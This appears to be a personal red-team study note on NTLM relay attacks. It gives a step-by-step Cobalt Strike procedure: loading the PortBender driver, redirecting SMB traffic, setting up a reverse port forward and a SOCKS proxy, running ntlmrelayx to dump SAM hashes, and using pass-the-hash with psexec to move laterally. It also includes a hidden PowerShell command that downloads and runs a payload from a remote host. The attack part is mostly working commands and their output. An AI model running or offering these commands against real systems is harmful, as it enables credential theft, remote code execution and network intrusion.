---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[NTLM Relaying]]  
___

## Description:  

In an NTLM relay attack, an attacker is able to intercept or capture this authentication traffic and effectively allows them to impersonate the client against the same, or another service.  For instance, a client attempts to connect to Service A, but the attacker intercepts the authentication traffic and uses it to connect to Service B as though they were the client.

### Kali
[[ntlmrelayx.py]]

[[responder]]

### CobaltStrike
1.  Use a [driver](https://reqrypt.org/windivert.html) to redirect traffic destined for port 445 to another port (e.g. 8445) that we can bind to.
2.  Use a reverse port forward on the port the SMB traffic is being redirected to.  This will tunnel the SMB traffic over the C2 channel to our Team Server.
3.  The tool of choice (ntlmrelayx) will be listening for SMB traffic on the Team Server.
4.  A SOCKS proxy is required to allow ntlmrelayx to send traffic back into the target network.


[PortBender](https://github.com/praetorian-inc/PortBender) is a reflective DLL and Aggressor script specifically designed to help facilitate this through Cobalt Strike.  It requires local admin access in order for the driver to be loaded, and that the driver be located in the current working directory of the Beacon.  It makes sense to use `C:\Windows\System32\drivers` since this is where most Windows drivers go.

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> pwd
[*] Current directory is C:\Windows\system32\drivers

beacon> upload C:\Tools\PortBender\WinDivert64.sys
```
Next, load `PortBender.cna` from `C:\Tools\PortBender` - this adds a new `PortBender` command to the console.
```
beacon> help PortBender
Redirect Usage: PortBender redirect FakeDstPort RedirectedPort
Backdoor Usage: PortBender backdoor FakeDstPort RedirectedPort Password
Examples:
	PortBender redirect 445 8445
	PortBender backdoor 443 3389 praetorian.antihacker
```

Execute PortBender to redirect traffic from 445 to port 8445.

This will break any SMB service on the machine!

```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP
```

Next, create a reverse port forward that will then relay the traffic from port 8445 to port 445 on the Team Server (where ntlmrelayx will be waiting).
```
beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445
```

We also need the SOCKS proxy so that ntlmrelayx can send responses to the target machine.
```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```


start ntlmrelayx By default it will use [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to dump the local SAM hashes from the target machine (you can also use a target list like it was done here [[ntlmrelayx.py#^a8df20]].

```
proxyxhains python3 /usr/local/bin/ntlmrelayx.py smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server
```

Now wait for traffic (or for a POC you can generate it yourself). Or you can try to force authentication [[Forcing NTLM Authentication]]

```
H:\>hostname
wkstn-2

H:\>whoami
dev\nlamb

H:\>dir \\10.10.17.231\blah

```

Local NTLM hashes could then be cracked or used with pass-the-hash.

```
beacon> pth .\Administrator b423cdd3ad21718de4490d9344afef72

beacon> jump psexec64 srv-2 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_a3) on srv-2 via Service Control Manager (\\srv-2\ADMIN$\3695e43.exe)
Started service 3695e43 on srv-2
[+] established link to child beacon: 10.10.17.68

```

Instead of being limited to dumping NTLM hashes, ntlmrelayx also allows you to execute an arbitrary command against the target.  In this example, I download and execute a PowerShell payload.

```
root@kali:~# proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c
'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'

```

To stop PortBender, stop the job and kill the spawned process.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    1240  PortBender

beacon> jobkill 0
beacon> kill 1240

```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (10:55 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
